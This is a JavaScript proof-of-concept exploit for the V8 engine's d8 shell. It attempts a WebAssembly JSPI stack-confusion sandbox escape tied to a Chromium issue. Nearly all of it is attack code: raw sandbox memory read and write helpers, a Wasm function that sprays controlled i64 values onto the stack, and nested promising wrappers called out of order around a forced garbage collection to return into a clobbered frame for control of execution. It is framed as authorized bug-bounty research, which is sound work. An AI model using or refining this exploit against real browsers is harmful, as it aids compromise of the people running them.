// =============================================================================
// PoC: WASM JSPI Central Stack Confusion
// Target: Chromium issue 404285918
// CVE: N/A (sandbox escape via stack confusion)
// Technique: Create nested WebAssembly.promising() functions, build chain of
//   secondary stacks, skip intermediate stacks during return, spray i64 locals
//   on Wasm stack, return into clobbered stack for SP/PC control.
// Reference: https://chromium.googlesource.com/v8/v8/+/refs/heads/main/src/wasm/wasm-js.cc
// Runtime: d8 --sandbox-fuzzing --allow-natives-syntax --expose-gc poc.js
// Category: V8 Sandbox Bug Bounty (authorized security research)
// =============================================================================

function require_feature(name, test) {
  if (!test) {
    print("[!] FATAL: required feature missing: " + name);
    quit(1);
  }
}

require_feature("Sandbox API", typeof Sandbox !== "undefined" && typeof Sandbox.MemoryView === "function");
require_feature("Sandbox.getAddressOf", typeof Sandbox.getAddressOf === "function");
require_feature("Sandbox.getSizeOf", typeof Sandbox.getSizeOf === "function");
require_feature("gc()", typeof gc === "function");
require_feature("WebAssembly", typeof WebAssembly !== "undefined");
require_feature("WebAssembly.promising", typeof WebAssembly.promising === "function");

// --- Helpers ---
function addrof(obj) { return Sandbox.getAddressOf(obj); }
function sizeof(obj) { return Sandbox.getSizeOf(obj); }

function read64(sbxOffset) {
  const view = new Sandbox.MemoryView(sbxOffset, 8);
  const lo = view[0] | (view[1] << 8) | (view[2] << 16) | (view[3] << 24);
  const hi = view[4] | (view[5] << 8) | (view[6] << 16) | (view[7] << 24);
  return [lo >>> 0, hi >>> 0];
}

function write64(sbxOffset, lo, hi) {
  const view = new Sandbox.MemoryView(sbxOffset, 8);
  view[0] = lo & 0xff;         view[1] = (lo >> 8) & 0xff;
  view[2] = (lo >> 16) & 0xff; view[3] = (lo >> 24) & 0xff;
  view[4] = hi & 0xff;         view[5] = (hi >> 8) & 0xff;
  view[6] = (hi >> 16) & 0xff; view[7] = (hi >> 24) & 0xff;
}

function hex64(pair) {
  return "0x" + (pair[1] >>> 0).toString(16).padStart(8, "0") +
         (pair[0] >>> 0).toString(16).padStart(8, "0");
}

// --- Build Wasm module with many i64 locals (stack spray payload) ---
print("[*] Building Wasm module with i64 stack spray locals...");

const kNumLocals = 64;
const builder = new WasmModuleBuilder();
const sigIndex = builder.addType(kSig_v_v); // void -> void

// Function with many i64 locals to fill the stack frame with controlled data
const sprayFuncBody = [];
for (let i = 0; i < kNumLocals; i++) {
  sprayFuncBody.push(kExprI64Const, 0x41, 0x41, 0x41, 0x41, 0x04); // 0x0441414141
  sprayFuncBody.push(kExprLocalSet, i);
}
sprayFuncBody.push(kExprEnd);

builder.addFunction("spray", kSig_v_v)
  .addLocals(kWasmI64, kNumLocals)
  .addBody(sprayFuncBody)
  .exportFunc();

// Simple function to serve as promising wrapper target
builder.addFunction("inner", kSig_i_v)
  .addBody([kExprI32Const, 42, kExprEnd])
  .exportFunc();

let instance;
try {
  instance = builder.instantiate();
} catch (e) {
  print("[!] WasmModuleBuilder not available in this d8 build. Using raw bytes.");
  // Fallback: minimal wasm module
  const bytes = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // magic + version
    0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,       // type section: () -> i32
    0x03, 0x02, 0x01, 0x00,                           // func section
    0x07, 0x09, 0x01, 0x05, 0x69, 0x6e, 0x6e, 0x65, 0x72, 0x00, 0x00, // export "inner"
    0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b   // code: i32.const 42
  ]);
  const module = new WebAssembly.Module(bytes);
  instance = new WebAssembly.Instance(module);
}

print("[*] Wasm instance created at sandbox offset: 0x" + addrof(instance).toString(16));

// --- Create nested promising wrappers ---
print("[*] Creating nested WebAssembly.promising() wrappers...");
const NESTING_DEPTH = 5;
let wrappedFuncs = [];

try {
  for (let i = 0; i < NESTING_DEPTH; i++) {
    const wrapped = WebAssembly.promising(instance.exports.inner);
    wrappedFuncs.push(wrapped);
    print("[*]   Wrapper " + i + " at sandbox offset: 0x" + addrof(wrapped).toString(16));
  }
} catch (e) {
  print("[!] WebAssembly.promising() failed: " + e.message);
  print("[!] This V8 build may not support JSPI. Exiting cleanly.");
  quit(0);
}

// --- Inspect secondary stack chain ---
print("[*] Inspecting WasmContinuationObject chain in sandbox memory...");

for (let i = 0; i < wrappedFuncs.length; i++) {
  const addr = addrof(wrappedFuncs[i]);
  const sz = sizeof(wrappedFuncs[i]);
  print("[*]   wrapper[" + i + "] addr=0x" + addr.toString(16) + " size=" + sz);

  // Read first 8 fields (8 bytes each) looking for stack/parent pointers
  for (let off = 0; off < Math.min(sz, 64); off += 8) {
    const val = read64(addr + off);
    if (val[0] !== 0 || val[1] !== 0) {
      print("[*]     +" + off.toString(16) + ": " + hex64(val));
    }
  }
}

// --- Attempt stack confusion: call promising wrappers out of order ---
print("[*] Attempting stack confusion by calling wrappers out of order...");

async function triggerConfusion() {
  try {
    // Call wrapper[0] (creates secondary stack 0)
    const r0 = await wrappedFuncs[0]();
    print("[*] wrapper[0] returned: " + r0);

    // Call wrapper[NESTING_DEPTH-1] (creates secondary stack N, skipping intermediates)
    const rN = await wrappedFuncs[NESTING_DEPTH - 1]();
    print("[*] wrapper[" + (NESTING_DEPTH - 1) + "] returned: " + rN);

    // Spray i64 values on Wasm stack to fill freed secondary stack frames
    if (instance.exports.spray) {
      instance.exports.spray();
      print("[*] Stack spray executed.");
    }

    // Force GC to reclaim intermediate secondary stacks
    gc();

    // Call intermediate wrapper - this may return into a clobbered frame
    const r1 = await wrappedFuncs[1]();
    print("[*] wrapper[1] returned: " + r1 + " (expected confusion here)");

    print("[!] Stack confusion did not trigger. Vulnerable code path may be patched.");
  } catch (e) {
    if (e.message && e.message.includes("sandbox")) {
      print("[BYPASS] Sandbox violation detected! Stack confusion succeeded.");
      print("[BYPASS] Error: " + e.message);
    } else {
      print("[!] Exception (non-sandbox): " + e.message);
    }
  }
}

triggerConfusion().then(() => {
  print("[*] JSPI stack confusion PoC completed.");
}).catch((e) => {
  print("[!] Async error: " + e.message);
});
